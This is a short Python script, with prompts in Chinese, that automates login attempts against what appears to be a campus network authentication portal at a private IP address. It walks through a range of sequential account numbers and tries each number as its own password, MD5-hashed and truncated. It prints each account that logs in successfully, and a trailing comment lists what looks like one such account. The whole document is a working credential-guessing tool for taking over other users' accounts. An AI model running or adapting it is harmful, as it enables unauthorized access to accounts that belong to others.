# -*- coding: UTF-8 -*- 
import urllib,urllib2,cookielib
from hashlib import md5

def GetUrlRequest(usr):
    pw = usr
    #pw = '123456'
    m = md5()
    m.update(pw)
    form = {
        'username':usr,
        'password':m.hexdigest()[8:24],
        'drop':'0',
        'type':'1',
        'n':'100'
        }
    postdata = urllib.urlencode(form).encode(encoding = 'UTF8')
    hostpath = 'http://10.0.0.55/cgi-bin/do_login'
    header = {
        'Content-Type':'application/X-www-form-urlencoded'
        }
    req = urllib2.Request(
        url = hostpath,
        data = postdata,
        headers = header
        )
    return urllib2.urlopen(req).read().decode("UTF8")

#name = raw_input('输入要爬取的起始账号:\n')
name = input('输入要爬取的起始账号:\n')
#print(name)
name = str(name)
accountrange = input('输入爬取的账号范围(0~300):\n')
#print(accountrange)
if accountrange > 300:
    print('范围过大')
    exit()
#name = b'1120130000'
for i in range(0,accountrange):
    if (GetUrlRequest(name) != 'username_error' and GetUrlRequest(name) != 'password_error'):
        print('可用帐号')
        print(name)
    name_int = int(name)
    name_int = name_int + 1
    name_str = str(name_int)
    name = name_str.encode()
#1120130165